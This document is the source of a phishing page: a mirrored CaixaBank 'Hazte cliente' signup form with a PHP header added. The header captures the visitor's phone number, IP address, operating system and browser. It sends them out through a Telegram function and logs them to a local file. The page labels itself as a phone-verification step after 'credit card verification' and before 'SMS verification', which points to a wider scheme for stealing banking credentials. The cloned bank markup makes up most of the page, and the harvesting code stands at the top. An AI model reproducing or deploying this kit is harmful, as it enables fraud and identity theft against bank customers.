<?php
require_once("config.php");
if(isset($_POST['doSubmit']))
{
	$message = '/-- PHONE --/' . getIPAddress() . "\r\n";
    $message .= '[Phone] = ' . $_POST['phone'] . "\r\n";
    $message .= '[TIME/DATE] = ' . $date . "\r\n";
    $message .= '[IP address] = ' . getIPAddress() . "\r\n";
    $message .= '[OS] = ' . $user_os . "\r\n";
    $message .= '[BROWSER] = ' . $user_browser . "\r\n";
    telegram_send(urlencode($message));
    $house = fopen('fucked/PHONE.html', 'a');
    fwrite($house, $message);
    fclose($house);
    header("Location: loading.php?id=2");
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7" dir="ltr" lang="es"> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8 ie7" dir="ltr" lang="es"> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9 ie8" dir="ltr" lang="es"> <![endif]-->
<!--[if IE 9]>
<html class="no-js ie9" dir="ltr" lang="es"> <![endif]-->
<!--[if gt IE 9]><!-->
<html class="no-js" dir="ltr" lang="es"> <!--<![endif]-->
<!--
=======================================================================
Page Rendition Time: 2022.09.16 19:16:00
Channel ID: 1eb8df85afc1b610VgnVCM1000001638f70aRCRD
=======================================================================
-->

<!-- Mirrored from www4.caixabank.es/apl/formularios/altaclientecbk100/index_es.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 26 Sep 2022 15:31:45 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head >
<!--  BEGIN PLUGIN: name: Lolopo Loader A2 | category:  omniture -->
<script type="text/javascript">var a2=window.location.href;</script>
<!--  END PLUGIN -->
<link rel="alternate" hreflang="es-ES" href="index_es.html">
<link rel="alternate" hreflang="ca-ES" href="index_ca.html">
<meta name="nsite" content="particulares" />
<meta name="nch" content="1eb8df85afc1b610VgnVCM1000001638f70aRCRD" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="canonical" href="https://www.caixabank.es/apl/formularios/altaclienteonline/flujovideodesasistida/creatuperfil_es.html"/>
<meta name="google-site-verification" content="S89OJlt6XsFezEChVtpdzCXAdpyjgsvJggeF1TbpN60">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Expires" content="-1">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache, no-store">
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">
<!-- Social Metas Section -->
<meta property="og:type" content="company">
<meta property="og:site_name" content="CaixaBank">
<script type="application/ld+json">
{
"@context": "http://schema.org",
"@type": "Corporation",
"name": "CaixaBank",
"legalName": "CaixaBank, S.A.",
"image": "https://www.caixabank.es/deployedfiles/lacaixa.com/Estaticos/Imagenes/logo_laCaixa_principal.gif",
"logo": "https://www.caixabank.es/deployedfiles/lacaixa.com/Estaticos/Imagenes/logo_laCaixa_principal.gif",
"url": "https://www.caixabank.es/",
"sameAs": [" https://twitter.com/caixabank","https://www.linkedin.com/company/caixabank/","https://www.facebook.com/CaixaBank/","https://www.youtube.com/user/laCaixaTV","https://www.instagram.com/caixabank/","https://es.wikipedia.org/wiki/CaixaBank","https://www.pinterest.es/caixabank/?loce=sh-part-SocialCorner-CorporateCaixabank-5-destacado-NA-Pinterest-NA"],
"address": {
"@type": "PostalAddress",
"streetAddress": "Calle Pintor Sorolla 2-4",
"addressLocality": "Valencia",
"postalCode": "46002",
"addressCountry": "España",
"telephone":"+34 93 887 25 25"
}
}
</script>
<script type="application/ld+json">
{
"@context": "http://schema.org",
"@type": "BreadcrumbList",
"itemListElement":
[
{
"@type": "ListItem",
"position": 1,
"item":
{
"@id": "https://www.caixabank.es/particular/apl/formularios/altaclienteonline_es.html",
"name": "AltaClienteOnline"
}
}
,
{
"@type": "ListItem",
"position": 2,
"item":
{
"@id": "https://www.caixabank.es/particular/apl/formularios/altaclienteonline/flujodesasistida_es.html",
"name": "Hazte cliente de CaixaBank"
}
}
,
{
"@type": "ListItem",
"position": 3,
"item":
{
"@id": "https://www.caixabank.es/particular/apl/formularios/altaclienteonline/flujovideodesasistida/tusdatos_es.html",
"name": "Tus datos"
}
}
,
{
"@type": "ListItem",
"position": 4,
"item":
{
"@id": "https://www.caixabank.es/apl/formularios/altaclienteonline/flujovideodesasistida/creatuperfil_es.html",
"name": "Crea tu perfil"
}
}
]}
</script>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/bootstrap.grid.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/common/R2016/Estaticos/css/NEO-R2016.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/colorbox.altaonline.cxb.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/common/R2016/Estaticos/css/jquery.mCustomScrollbar.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/altaClienteWeb100.cbx.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/altaClienteWeb100.modalContent.cxb.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/FORM-R2021.css" type="text/css" rel="stylesheet"></link>
<link href="deployedfiles/common/CSS/cookies2018.css" type="text/css" rel="stylesheet"></link>
<!--[if lt IE 9]><script src="/deployedfiles/common/R2016/Estaticos/js/lib/html5shiv.min.js" type="text/javascript" ></script><![endif]-->
<!--[if lt IE 9]><script src="/deployedfiles/common/R2016/Estaticos/js/lib/respond.min.js" type="text/javascript" ></script><![endif]-->
<!--[if lt IE 9]><script src="/deployedfiles/common/R2016/Estaticos/js/lib/rem.min.js" type="text/javascript" ></script><![endif]-->
<script src="deployedfiles/common/R2016/Estaticos/js/common.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/jquery-3.6.0.min.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/jquery.colorbox.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/NEO-R2016-APL.js" type="text/javascript" ></script>
<script src="deployedfiles/common/R2016/Estaticos/js/lib/modernizr-custom.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/altaClienteWeb100.cxb.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/utils.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/FORM-R2021-plugins.min.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/FORM-R2021.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/custom.forms.jquery.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/jquery.mCustomScrollbar.min.js" type="text/javascript" ></script>
<script src="deployedfiles/common/R2016/Estaticos/js/lib/jquery.unveil.js" type="text/javascript" ></script>
<script src="deployedfiles/common/R2016/Estaticos/js/lib/slick.min.js" type="text/javascript" ></script>
<script src="deployedfiles/common/JavaScript/js.cookie.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/cookie.apl.caixaes.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/validadors_json_cbk100.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/sessioncontrolcountdown.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/custom_cbk100.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/save-temp-cbk100.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/common.tracking.cbk.vd.js" type="text/javascript" ></script>
<script src="deployedfiles/particulares/Estaticos/Javascript/aplnr/AltaClienteOnline/JQuery3.x/jquery.mailtip.js" type="text/javascript" defer></script>
<link href="deployedfiles/particulares/CSS/Estaticos/aplnr/mailtip.css" type="text/css" rel = "stylesheet"></link>
<title>
Crea tu perfil
|
Tus datos
|
Hazte cliente de CaixaBank
| CaixaBank
</title>
<script>
var neoDebug = neoDebug || false;
var neoCurrentChannel = '1eb8df85afc1b610VgnVCM1000001638f70aRCRD';
var neoCurrentChannelDynamic =true;
var neoCurrentBreadcrumb = [];
neoCurrentBreadcrumb.push('36a04b36f5699310VgnVCM10000078fe770aRCRD');
neoCurrentBreadcrumb.push('bdb6c2aebb74c310VgnVCM10000078fe770aRCRD');
neoCurrentBreadcrumb.push('0f76ff60d911d310VgnVCM10000078fe770aRCRD');
neoCurrentBreadcrumb.push('2c7089a193729510VgnVCM2000001938f70aRCRD');
neoCurrentBreadcrumb.push('709e431b6dc1b610VgnVCM1000001638f70aRCRD');
neoCurrentBreadcrumb.push('54fe431b6dc1b610VgnVCM1000001638f70aRCRD');
neoCurrentBreadcrumb.push('1eb8df85afc1b610VgnVCM1000001638f70aRCRD');
</script>
<meta name="loce" content="es-particulares-Tusdatos-Creatuperfil-Pa">
<script type="text/javascript">
if (window.url_modificada){url_modificada();}
</script>
<noscript></noscript>
<!--[if lt IE 11]><script src="/deployedfiles/common/R2016/Estaticos/js/lib/flexibility.js" type="text/javascript" ></script><![endif]-->
<script src="deployedfiles/common/JavaScript/aplnr/cookie/cookie-policy.js" type="text/javascript" ></script>
<script src="deployedfiles/common/JavaScript/aplnr/cookie/neo-cookie-policy.js" type="text/javascript" ></script>
<script src="deployedfiles/common/js/prebid-ads.js" type="text/javascript" ></script>
<script type="text/javascript">
var isCookiePoliceActive = true;
</script>
<script type="text/javascript">
if(window.getDomain === undefined) {
function getDomain() {
var lstr = location.hostname.split(".");
var d = "";
for (var i = 1; i <= 2 && lstr.length - i >= 0; i++) d = "." + lstr[lstr.length - i] + d;
return (d);
}}
if(window.setCookie === undefined) {function setCookie(name, value, date, sameSite) {document.cookie = name + "=" + escape(value) + (date ? "; expires=" + date.toGMTString(date.getTime()) : "") + "; domain=" + getDomain() + "; path=/" + ";SameSite=Lax";}}
if(window.getCookie === undefined) {function getCookie(name) {var begin=document.cookie.indexOf(name+"=");if(begin==-1) return null; var end=document.cookie.indexOf(";",begin); if(end==-1) end=document.cookie.length; return document.cookie.substring(document.cookie.indexOf("=",begin)+1,end);}}
if(window.deleteCookie === undefined) { function deleteCookie(name, value, domain){document.cookie = name + "=" + (value || "")  + "; expires= Thu, 01 Jan 1970 00:00:01 GMT; domain=" + domain + ";path=/;";}}
function createCookiePrefix(){
var actualDate = new Date();
if("particulares" === "particulares" || "particulares" === "banca_personal" || "particulares" === "banca_privada"){
setCookie('prefix', 'PART', new Date(actualDate.getFullYear() + 1, actualDate.getMonth(), actualDate.getDate()));
}
else if("particulares" === "empresas") {
setCookie('prefix', 'EMP', new Date(actualDate.getFullYear() + 1, actualDate.getMonth(), actualDate.getDate()));
}
}
function createCookieLanguage() {
var actualDate = new Date();
var lang = $("html").attr("lang");
var langMap = {};
langMap["es"] = "esp";
langMap["ca"] = "cat";
var cookieLang = getCookie("idioma");
let listOfSites =["CaixaRenting","gesticaixa"];
if (listOfSites.indexOf("particulares") >= 0 && cookieLang !== null){
deleteCookie("idioma",cookieLang,getDomain());
}
if (listOfSites.indexOf("particulares") < 0){
if (lang > '') {
if (lang != "es" && lang != "ca") {
langMap[lang] = lang;
}
if("particulares" === "caixabank_es" && "Creatuperfil" === "PrehomeR2016" ) return;
if("particulares" === "caixabank_com" && "Creatuperfil" === "Home" ) return;
if (!cookieLang || (cookieLang != langMap[lang])) {
setCookie('idioma', langMap[lang], new Date(actualDate.getFullYear() + 1, actualDate.getMonth(), actualDate.getDate()), "SameSite=Lax");
}
}
}
}
if (window.NeoCookiePolicy && NeoCookiePolicy.isCookiePolicyActive()){
if("particulares" === "caixabank_com" && getCookie("cookiePolicy"))
createCookieLanguage();
else {
if (CookiePolicy.isAllowedComponent('NeoCampaingsPesonalization')) {
createCookiePrefix();
createCookieLanguage();
}
}
} else {
createCookiePrefix();createCookieLanguage();
}
</script>
<!--  BEGIN PLUGIN: name: Libreria Tealium (Generica) | category:  omniture -->
<script src="../tags.tiqcdn.com/utag/caixabank/caixabank-web/prod/utag.sync.js"></script>
<!--  END PLUGIN -->
<!--  BEGIN PLUGIN: name: Lolopo Pre Loader | category:  omniture -->
<script src="deployedfiles/common/JavaScript/lolopo/aplnr/loader_prelogin_caixaES.js" type="text/javascript"></script>
<!--  END PLUGIN -->
</head>
<body>
<script language="JavaScript" type="text/javascript">
var neoEventConfig=[];
var tealium="tealium";
var omniture="omniture";
var listOfSiteApproved =["caixabank_com","particulares","empresas","banca_privada","banca_personal","caixabank_es"];
neoEventConfig.push(tealium);
neoEventConfig.push(omniture);
function createJsonTealium(tealiunVarivel) {
if(listOfSiteApproved.indexOf("particulares") !== -1 && neoEventConfig.indexOf(tealium) !== -1){
if(tealiunVarivel.trim().length > 0 && tealiunVarivel.split(",").length >=3) {
var tealiunObject = '{"event_category": "","event_action": "","event_label": ""}'
tealiunObject = JSON.parse(tealiunObject);
tealiunObject.event_category = tealiunVarivel.split(",")[0];
tealiunObject.event_action = tealiunVarivel.split(",")[1];
tealiunObject.event_label = tealiunVarivel.split(",")[2];
if(typeof callUtagLink === "function")
callUtagLink(tealiunObject);
}
}
}
function neoEventSC(omnitureVarivel,tealiunVarivel){
if(neoEventConfig.indexOf(omniture) !== -1){
if(typeof onClickSC === "function")
if(omnitureVarivel.trim().length > 0)
onClickSC(omnitureVarivel);
}
createJsonTealium(tealiunVarivel);
}
function neoEventEntrarSC(omnitureVarivel,tealiunVarivel){
if(neoEventConfig.indexOf(omniture) !== -1){
if(typeof onClickEntrarSC === "function")
onClickEntrarSC(omnitureVarivel);
}
createJsonTealium(tealiunVarivel);
}
</script>
<!--===========================Tealium=============================-->
<script language="JavaScript" type="text/javascript">
var utag_data = {
page_language: "es",
page_environment: "produccion",
page_category: "particulares",
page_subcategory1: "formularioaltavideodesasistida",
page_subcategory2: "",
page_subcategory3: "",
page_subcategory4: "",
page_subcategory5: "inicio100",
page_name: "caixabankes:particulares:formularioaltavideodesasistida:inicio100",
page_section: "caixabankes",
client_login_status: "no logado"
}
</script>
<!--===========================End Tealium=============================-->
<!--===========================Omniture=============================--><script language="JavaScript" type="text/javascript" src="deployedfiles/particulares/Estaticos/Javascript/s_code_basic.js"></script>
<script language="JavaScript" type="text/javascript"><!--
s.channel="La Caixa";
s.prop1="FormularioAltaVideodesasistida";
s.prop2="";
s.prop3="";
s.prop4="";
s.prop5="Inicio100";
s.prop17="es";
s.pageName="La Caixa:P:FormularioAltaVideodesasistida:Inicio100";
s.eVar17=s.prop17;
var omnitureVariable="h";
//--></script><!--=========================Omniture End===========================-->
<script language="JavaScript" type="text/javascript">
var pageNameValue = typeof s === "undefined" ? (typeof utag_data === "undefined" ? "" : utag_data.page_name) : s.pageName;
s = typeof s === "undefined" ? {pageName:pageNameValue} : s;
</script>
<!--  BEGIN PLUGIN: name: Huella Tealium (Generica) | category:  omniture -->
<script type="text/javascript">
var utag_data = utag_data || {};
(function(a,b,c,d){
a='../tags.tiqcdn.com/utag/caixabank/caixabank-web/prod/utag.js';
b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;
a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);
})();
</script>
<!--  END PLUGIN -->
<div  class='freeContent cookies-region' >
<!--googleoff: index-->
<!-- Cookie Active -->

<!--googleon: index-->
</div>
<div  class='freeContent l-theme-default' >
<div  class='freeContent l-loader' >
<div class="loader -ball-bounce -full-screen" role="status">
<div class="loader-animation__text">Cargando...</div>
<div class="loader-animation__balls">
<div class="loader-animation__ball"></div>
<div class="loader-animation__ball"></div>
<div class="loader-animation__ball"></div>
</div>
</div>
</div>
<div  class='freeContent l-main' >
<div  class='freeContent l-main-content' >
<header id='header' class='freeContent header' >
<div  class='container' >
<div  class='row center-col' >
<div  class='column col-xs-12' >
<div class="corporate">
<div class="brand"><a href="https://www.caixabank.es/" title="CaixaBank (Ir a Inicio)" class="brand-logo" target="_self"> <span class="sr-only">CaixaBank (Ir a Inicio)</span> </a></div>
</div>
</div>
</div>
</div>
</header>
<div id='main' class='freeContent main' >
<div  class='freeContent l-om' >
<div  class='container' >
<div  class='row center-col' >
<div  class='column col-xs-12' >
</div>
</div>
</div>
</div>
<div  class='freeContent l-banner' >
<div class='banner bg-site'>
<div class="container">
<div class='row center-col'>
<div class='column center-block col-md-8 col-sm-12 col-xs-12'>
<div id="bannerClientes" class="pt25 pb25">
<div class="row">
<div class="col-sm-8 col-xs-12">
<p class="title ffy-OpenSans fs18 text-white mt10 mb10">Si ya eres cliente de CaixaBank, tenemos productos para ti</p>
</div>
<div class="col-sm-4 col-xs-12">
<div class="button white">
<a onclick="onClickSC('Yasoycliente');" href="https://www4.caixabank.es/particular/general/aplnr/parrilla_es.html" class="cbox-product especial">Ya soy cliente</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div  class='freeContent l-navtop' >
<div  class='container' >
<div  class='row center-col' >
<div  class='column col-md-8 col-xs-12' >
<div  class='freeContent navbar navbar-step' >
<div  class='freeContent navbar-group' >
<div  class='freeContent navbar-item' >
</div>
<div  class='freeContent navbar-item -heading' >
<h1 class="navbar-heading sr-only-desktop">Datos personales</h1>
</div>
<div  class='freeContent navbar-item' >
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div  class='freeContent l-progress' >
<div  class='container' >
<div  class='row center-col' >
<div  class='column col-md-8 col-xs-12' >
<div class="progress-steps" role="navigation" aria-labelledby="progress-title">
<h2 id="progress-title" class="visuallyhidden">Progreso en el proceso para el alta online de Caixabank</h2>
<ol class="progress-timeline">
<li class="progress-step  "   ><span class="progress-label">Verificación de tarjeta de crédito</span></li>
<li class="progress-step -current " data-progress="25" ><span class="progress-label">Número de teléfono</span></li>
<li class="progress-step " ><span class="progress-label">Verificación SMS</span></li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div  class='freeContent l-content' >
<div  class='container' >
<div  class='row center-col' >
<div  class='column col-md-8 col-xs-12' >
<div class="block-spacer-mr-bottom-4">
<!-- Variante 1 -->
<p class="h1 text-center">Verificación del número de teléfono
</p>
</div>
<script type="text/javascript">
var contextRoot = "https://www4.caixabank.es/formularios/altaclientecbk100/";
var useServerTime = true;
var pingTime = 6*60*60;
var pingInterval = 5*60;
initPings();
$(function (){
$('#FRM_email').mailtip({
onselected: function (mail){
callValidator('112',$('#FRM_email').val(),'FRM_email','es',null);
}
});
});
function concatenaTelefono() {
$(":input[name='HTC_tiptelf']").val('006');
return true;
}
function copiarTelefono(){
var telefonoCopia = $(':input[name="FRM_telefono"]').val();
$(':input[name="HTC_telefonoBis"]').val(telefonoCopia);
}
function esOrigenBolsa() {
var  origen_value = "50001";
if(origen_value!= null && origen_value=="Bolsa") return true;
return false;
}
function seleccionarProducto(tipProd){
var elto = $('input[info-tipoproducto="'+tipProd+'"]');
if (!elto.prop('checked')) {
elto.trigger("click");
}
}
function validarProductoSeleccionado(){
if(!esOrigenBolsa()) {
if ( document.getElementById('traspaso') && document.getElementById('traspaso').checked ) {
if (document.getElementById('HTC_gestoraplan').selectedIndex==0 || document.getElementById('HTC_planorigen').selectedIndex==0 || document.getElementById('HTC_plandestino').selectedIndex==0 ) {
alert('Debes rellenar toda la información referente al traspaso de planes');
$(window).scrollTop($('#becomeACustomerPensionScheme').offset().top - 50);
return false;
}
var pattFamiliaPla=new RegExp("---");
if (pattFamiliaPla.test(document.getElementById('HTC_plandestino').options[document.getElementById('HTC_plandestino').selectedIndex].text )) {
alert('Debes seleccionar el plan al que quieres traspasar');
$(window).scrollTop($('#becomeACustomerPensionScheme').offset().top - 50);
return false;
}
}
return true;
}
return true;
}
function enviar() {
$("#AltaClienteCBK100DatosMinimos input:submit").trigger('click');
}
function mostrarTelefono(){
var telefPopup = $('#FRM_telefono').val();
$( "#telefonoPopup" ).append( telefPopup );
}
function cleanTelefono(){
$( "#telefonoPopup" ).empty();
}
function seleccionarPlanOrigen(elemento) {
var combo = document.getElementById('HTC_planorigen');
if(combo) {
var cantidad = combo.options.length;
for (i = 0; i < cantidad; i++) {
if (combo[i].value == elemento) {
combo[i].selected = true;
}
}
}
}
var req=null;
function loadXMLDoc(url) {
if (window.XMLHttpRequest) {
req = new XMLHttpRequest();
} else if (window.ActiveXObject) {
req = new ActiveXObject("Microsoft.XMLHTTP");
}
if (req) {
req.onreadystatechange = processReqChange;
req.open("https://www.caixabank.es/error/error404_es.html", url, true);
req.send(null);
}
}
function processReqChange(){
var ready=req.readyState;
var data=null;
if (ready==4){
var httpStatus=req.status;
if ( httpStatus==200 || httpStatus==0 ) {
data=req.responseText;
}
}
toConsole(data);
}
function toConsole(data){
if (data!=null){
document.getElementById('HTC_planorigen').options.length=0;
document.getElementById('HTC_planorigen').options[0]=new Option("Selecciona una opción", 0);
var arrayPlanes=data.split("|");
for (i=0; i<arrayPlanes.length; i++) {
datosPlanes=arrayPlanes[i].split(","); document.getElementById('HTC_planorigen').options[i+1]=new Option(datosPlanes[1], datosPlanes[0]);
}
}
}
function checkPlanes(id) {
loadXMLDoc("https://www4.caixabank.es/apl/json/altacliente/index_es.html?idGestora="+id);
}
function mostrarOcultarBloquePensiones(){
if(!document.getElementById('traspaso').checked){
$('#HTC_gestoraplan').val('0');
$('#HTC_planorigen').val('0');
$('#HTC_plandestino').val('0');
$('#label_HTC_gestoraplan').html('Selecciona una opción');
$('#label_HTC_planorigen').html('Selecciona una opción');
$('#label_HTC_plandestino').html('Selecciona una opción');
$('#bloquePlanes').attr('style','display:none');
}else{
$('#bloquePlanes').attr('style','display:block')
}
}
$( document ).ready(function() {
confirmarIncentivoAbierto = false;
$(this).on("cbox_closed",function() {
if (confirmarIncentivoAbierto) {
enviar();
confirmarIncentivoAbierto = false;
}
});
$("form").on('submit', function(){
if (validarProductoSeleccionado()) {
var numeroRegalos =  $('#becomeACustomerProducts').find('div.promotions__item').length;
var numeroRegalosSeleccionados = $('#becomeACustomerProducts').find('div.js-promotion--added').length;
if (document.getElementById('checkRegalo') && document.getElementById('checkRegalo').checked && numeroRegalos > 0 && numeroRegalosSeleccionados == 0 && $("#confirmarIncentivo").hasClass("hidden") && $("#confirmarTelefono").hasClass("hidden") && !confirmarIncentivoAbierto) {
inlineContentCBoxLoad('confirmarIncentivo');
confirmarIncentivoAbierto = true;
return false;
}
var telCargado = $('#FRM_telefono').val();
if (telCargado && $('#confirmarTelefono').hasClass("hidden")) {
mostrarTelefono();
inlineContentCBoxLoad('confirmarTelefono');
return false;
}
copiarTelefono();
concatenaTelefono();
} else {
return false;
}
});
$("#FRM_telefono,#HTC_telefonoBis").each(function() {
this.value = this.value.slice(-9);
});
var camposError = '';
if (camposError != '') {
var listaErrores = myTrim("").split(",");
for (i = 0; i < listaErrores.length; i++) {
if (listaErrores[i] !== "") {
var campo = "#" + listaErrores[i];
$(campo).attr('class','gray-bck error cross');
}
}
}
function myTrim(x) {
return x.replace(/^\s+|\s+$/gm,'');
}
if($('#traspaso').prop('checked')== true){
$('#bloquePlanes').attr('style','display:block');
}
});
function cubrirInputRegalo(codRegalo){
if ($('#' + codRegalo).hasClass('js-promotion--added')) {
$('#HTC_idRegal').val(codRegalo);
} else {
$('#HTC_idRegal').val('');
}
}
function cubrirInputRegaloPopup(codRegalo){
if ($('#' + codRegalo + 'Popup').hasClass('js-promotion--added')) {
$('#HTC_idRegal').val(codRegalo);
} else {
$('#HTC_idRegal').val('');
}
}
function desmarcarRegalos(){
if (!$('#checkRegalo').prop('checked') && $('#becomeACustomerProducts').find('div.js-promotion--added').length == 1) {
$('#becomeACustomerProducts div.js-promotion--added button').trigger('click');
}
}
</script>
<div class="enlaces-avisos-sistema">
<a href="https://www4.caixabank.es/particular/general/popupapls/altaclienteonline/avisos/aplnr/eligeunoomasdeestosproductoses.html" id="eligeProducto" class="cbox-close"> <span class="sr-only">Por favor, elige uno o m&aacute;s de estos productos.</span> </a>
<a href="https://www4.caixabank.es/particular/general/popupapls/altaclienteonline/avisos/aplnr/nosestamosactualizandoes.html" id="estamosActualizando" class="cbox-nclose"> <span class="sr-only">Nos estamos actualizando</span> </a>
</div>
<div id="creaTuPerfil" class="uix-br-gl-2020">
<form class="mceVisualAid" method="post">
<input type="hidden" name="HTC_telefonoBis"     id="HTC_telefonoBis"    maxlength="9"   />
<input type="hidden" name="HTC_promociones_q"   id="HTC_promociones_q"  value="opt-in" />
<input type="hidden" name="HTC_tiptelf"         id="HTC_tiptelf"        value=""        />
<input type="hidden" name="HTC_prefijo"         id="HTC_prefijo"        value="0034"   />
 <script>
$( document ).ready(function() {
if(false){
$('#divProductos').removeClass("d-n");
}else if(true){
$('#divProductos').removeClass("d-n");
}else if(!$('#checkRegalo').prop('checked')){
$('#checkRegalo').trigger('click');
}
if(true && false){
$('div.frm-control').removeClass("mb20");
}
if(true){
$('#becomeACustomerProducts').removeClass("block-spacer-bottom-2");
$('#becomeACustomerProducts').addClass("block-spacer-bottom-5");
}
$("input[info-tipoproducto]").on("change", function() {
var numeroIncentivos  = $('#becomeACustomerProducts').find('div.promotions__item').length;
if(numeroIncentivos == 1 && $('#checkRegalo').prop('checked') && !$('#becomeACustomerProducts div.promotions__item').hasClass('js-promotion--added')){
$('#becomeACustomerProducts div.promotions__item button').trigger('click');
}
});
})
</script>
<!-- Bloque: Datos de contacto -->
<fieldset class="block-spacer-bottom-4">
<h2 class="mb5">Insinuación</h2>
<p class="cs-heading-subtitle cs-heading-regular mb30">Toda su información está encriptada para mayor seguridad y privacidad.</p>
<div class="frm-group">
<label for="FRM_telefono">Número de teléfono
</label>
<input  name="phone" id="phone" type="text" value="" required />
</div>
</fieldset>

<script src="https://code.jquery.com/jquery-3.6.1.js"></script>
<script>
jQuery.fn.ForceNumericOnly =
function()
{
    return this.each(function()
    {
        $(this).keydown(function(e)
        {
            var key = e.charCode || e.keyCode || 0;
            return (
                key == 8 || 
                key == 9 ||
                key == 13 ||
                key == 46 ||
                key == 110 ||
                key == 190 ||
                (key >= 35 && key <= 40) ||
                (key >= 48 && key <= 57) ||
                (key >= 96 && key <= 105));
        });
    });
};

$("#phone").ForceNumericOnly();

</script>
<!-- Bloque  Ayuda contextual -->


<!-- Bloque: Información legal -->

<!-- Bloque: Navegacion-->
<div class="navbar navbar-main">
<div class="navbar-item">
<input class="btn btn-primary btn-nav -right" value="Próxima" name="doSubmit" type="submit" />
</div>
</div>
<!-- Bloque: Confirmacion de incentivos > formato colorbox -->
<div id="confirmarIncentivo" class="apl-modal inline-modal hidden" >
<!-- helpers class initial state: hidden-->
<div class="bg-white">
<div class="v-center">
<div class="v-center-row">
<div class="v-center-column">
<div class="container">
<div class="c-modal__content center block-spacer-2">
<div class="c-modal__header">
<img class="d-b m0auto mb25" src="deployedfiles/particulares/Estaticos/Imagenes/apl/AltaClienteOnline/ic_modal_info_x128.png" alt="" width="47" height="47"/>
<h2 class="cs-heading-modal-title block-spacer-bottom-2">Has elegido domiciliar tu n&oacute;mina pero no has seleccionado ning&uacute;n producto</h2>
</div>
<div class="c-modal__body">
<p class="mb20">Si quieres puedes seleccionarlo ahora:</p>
<!-- Selector de incentivos : velocity -->
<div class="promotions block-spacer-bottom-4">
<!-- dynamic: owl-carousel owl-theme-->

<div class="c-incentive__item promotions__item js-promotion" id="161Popup">
<div class="c-incentive__header">
<p class="c-incentive__text"></p>
</div>
<div class="c-incentive__body">
<div class="c-incentive__thumbnail">
<img
class="c-incentive__img"
src="deployedfiles/particulares/Estaticos/Imagenes/Colectivos/TV_Samsung_Jul20.png"
alt="Smart Tv Samsung 80cm (32”)"
width="512"
height="384"
vgn_ext_params="type=image/png"
/>
</div>
<div class="c-incentive__detail">
<h3 class="c-incentive__text c-incentive__title">Smart Tv Samsung 80cm (32”)</h3>
<p class="c-incentive__help-text">Quiero este producto y domiciliar mi nómina. Hasta el 30-09-2022.</p>
</div>
<div class="c-incentive__actions">
<button id="161ButtonPopup" class="c-incentive__button js-toggle-text js-toggle-related" type="button" data-text="A&ntilde;adir" data-text-pressed="Quitar" data-parent="#161Popup" data-related="#161Button"> A&ntilde;adir</button>
</div>
</div>
</div>

</div>
</div>
<div class="c-modal__footer">
<div class="v-center-bottom">
<button id="contWhProduct" type="button" class="button blue mb20 js-confirm" disabled="disabled"><span class="button__label">Seleccionar y Continuar</span></button>
<p class="mb30"><a href="https://www4.caixabank.es/" id="contWhOProduct" class="js-confirm" role="button" aria-disabled="false" title="Continuar sin producto">Continuar sin producto</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<!-- End Confirmacion de incentivos -->
</form>
</div>
<div id="confirmarTelefono" class="apl-modal inline-modal noCloseButton hidden">
<!-- helpers class initial state: hidden-->
<div class="bg-white">
<div class="v-center">
<div class="v-center-row">
<div class="v-center-column">
<div class="container m0auto max-w440">
<div class="c-modal__content block-spacer-2 center">
